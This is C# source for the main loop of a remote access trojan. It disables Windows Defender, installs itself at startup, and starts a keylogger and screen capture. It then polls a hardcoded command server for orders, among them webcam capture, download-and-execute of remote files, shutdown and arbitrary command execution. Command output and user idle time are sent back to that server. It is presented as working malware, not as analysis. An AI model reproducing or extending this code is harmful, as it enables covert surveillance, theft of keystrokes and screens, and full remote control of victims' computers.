using System;
using System.ComponentModel;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows;

namespace stub
{
    internal class Program
    {

        public static class InputTimer
        {
            public static TimeSpan GetInputIdleTime()
            {
                int precision = 0;
                const int TIMESPAN_SIZE = 0;
                int factor = (int)Math.Pow(10, TIMESPAN_SIZE - precision);
                
                var plii = new NativeMethods.LastInputInfo();
                plii.cbSize = (UInt32)Marshal.SizeOf(plii);

                if (NativeMethods.GetLastInputInfo(ref plii))
                {
                    return TimeSpan.FromMilliseconds((long)Math.Round(1.0*(Environment.TickCount - plii.dwTime)/factor)*factor);

                }
                else
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
            }

            public static DateTimeOffset GetLastInputTime()
            {
                return DateTimeOffset.Now.Subtract(GetInputIdleTime());
            }

            private static class NativeMethods
            {
                public struct LastInputInfo
                {
                    public UInt32 cbSize;
                    public UInt32 dwTime;
                }

                [DllImport("user32.dll")]
                public static extern bool GetLastInputInfo(ref LastInputInfo plii);
            }
        }

        
        static void Main(string[] args)
        {
            string[] settingsArray = new string[8];

            settingsArray[0] = "True";
            settingsArray[1] = "True";
            settingsArray[2] = "True";
            settingsArray[3] = "True"; 
            settingsArray[4] = "True";
            settingsArray[5] = "SystemXOR";

            /*AppDomain.CurrentDomain.ProcessExit += new EventHandler(CurrentDomain_ProcessExit);

            using (StreamReader sr = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
            {
                using (BinaryReader br = new BinaryReader(sr.BaseStream))
                {
                    byte[] stubBytes = br.ReadBytes(Convert.ToInt32(sr.BaseStream.Length));
                    string settings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("BUILD")).Replace("BUILD", "");
                    settingsArray = settings.Split('|');
                }
            }*/


            string ID = settingsArray[5];
            MutexHandler.createMutex(ID);
            
            ConnectionIPHandler.IPSet("delta.alphahq.dx.am");
            WebClientHandler.initwebClient();

            ClientKeylogger.initClientKeylogger();
            ClientDesktop.initClientDesktop();

            if (settingsArray[0] == "True")
            {
                AntiProcess.StartAntiProcess();
            }
            if (settingsArray[1] == "True")
            {
                DisableDefender.initdisable();
            }
            if (settingsArray[2] == "True")
            {
                ClientKeylogger.StartKeylogger();
            }
            if (settingsArray[3] == "True")
            {
                ClientDesktop.StartDesktopCapture();
            }
            if (settingsArray[4] == "True")
            {
                ClientAdder.runAtStartup();
            }

            WebClient webclient = WebClientHandler.wcReturn();

            while (true)
            {
                
                System.Threading.Thread.Sleep(2000);

                string name = Dns.GetHostName();
                string cmdFromServer = "";

                try
                {
                    webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/idle.php", "client=" + name + "&idleTime=" + InputTimer.GetInputIdleTime().ToString());
                }
                catch { }
                try
                {
                    webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    cmdFromServer = webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/getServerCommands.php", "client=" + name);
                }
                catch { }
                

                if (cmdFromServer.Contains("nocmd" +
                    "")) continue;
                else if (cmdFromServer.Contains("startkeylog"))
                {
                    ClientKeylogger.StartKeylogger();
                }
                else if (cmdFromServer.Contains("stopkeylog"))
                {
                    ClientKeylogger.StopKeylogger();
                }
                else if (cmdFromServer.Contains("startdc"))
                {
                    ClientDesktop.StartDesktopCapture();
                }
                else if (cmdFromServer.Contains("stopdc"))
                {
                    ClientDesktop.StopDesktopCapture();
                }
                else if (cmdFromServer.Contains("getpclist"))
                {
                    GetProcessList.FetchProcess();
                }
                else if (cmdFromServer.StartsWith("http"))
                {
                    DownloadExecute.dlHandler(cmdFromServer);
                }
                else if (cmdFromServer.Contains("uninstall"))
                {
                    UninstallHandler.uninstall(cmdFromServer);
                }
                else if (cmdFromServer.Contains("uninstall stop"))
                {
                    UninstallHandler.uninstall(cmdFromServer);
                }
                else if (cmdFromServer.Contains("shutdown"))
                {
                    ShutdownHandler.shutdown(cmdFromServer);
                }
                else if (cmdFromServer.Contains("anti start"))
                {
                    AntiProcess.StartAntiProcess();
                }
                else if (cmdFromServer.Contains("anti stop"))
                {
                    AntiProcess.StopAntiProcess();
                }
                else if (cmdFromServer.Contains("webcam"))
                {
                    WebcamHandler.StartWebcamCapture();
                }
                else
                {
                    string retString = Commands.Run(cmdFromServer);
                    try
                    {
                        webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                        webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/retString.php", "client=" + name + "&retstr=" + retString);
                    }
                    catch { }
                }



            }

        }

        private static void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            WebClient webclient = WebClientHandler.wcReturn();

            try
            {
                webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/idle.php", "client=" + Dns.GetHostName() + "&idleTime=" + "Offline");
            }
            catch { }
        }
    }

}
